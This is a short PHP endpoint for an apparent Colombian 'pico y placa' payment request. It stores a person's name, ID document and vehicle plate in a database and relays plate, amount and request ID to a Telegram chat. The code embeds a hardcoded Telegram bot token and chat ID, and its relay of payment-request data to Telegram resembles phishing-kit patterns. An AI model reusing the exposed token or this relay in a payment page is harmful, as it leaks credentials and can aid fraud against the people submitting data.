<?php
// api/telegram_send.php
require_once __DIR__ . '/_bootstrap.php';

if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') json_err('method_not_allowed', 405);

$raw = file_get_contents('php://input');
$d = json_decode($raw, true) ?: [];

$placa = $d['placa'] ?? '';
$monto = $d['monto'] ?? 0;
$idSolicitud = $d['idSolicitud'] ?? '';
$nombreComp = $d['nombreCompleto'] ?? '';
$tipoDoc = $d['tipoDocumento'] ?? '';
$numDoc = $d['numeroDocumento'] ?? '';

$paymentId = 'PAY-' . date('YmdHis') . '-' . bin2hex(random_bytes(3));

// Guardar en BD
db_exec("INSERT INTO payments (id, estado, monto, placas, nombre, tipo_doc, num_doc)
         VALUES (?, 'pending', ?, ?, ?, ?, ?)",
        [$paymentId, (string)$monto, $placa, $nombreComp, $tipoDoc, $numDoc]);

$token = getenv('TG_TOKEN_SEND') ?: '8641560926:AAFoOqOUQ_2oqG98-R-R3DCMKHqBwF8R4NU';
$chat  = getenv('TG_CHAT_SEND') ?: '-5044680802';

$msg = "🚗 Nueva solicitud PYP\nPlaca: $placa\nMonto: $" . number_format((float)$monto, 0, ',', '.') . "\nID: $idSolicitud";

// Enviar a Telegram
@file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
    'chat_id' => $chat,
    'text' => $msg,
]), false, stream_context_create(['http' => ['timeout' => 5]]));

json_ok(['payment_id' => $paymentId, 'message_id' => 1]);
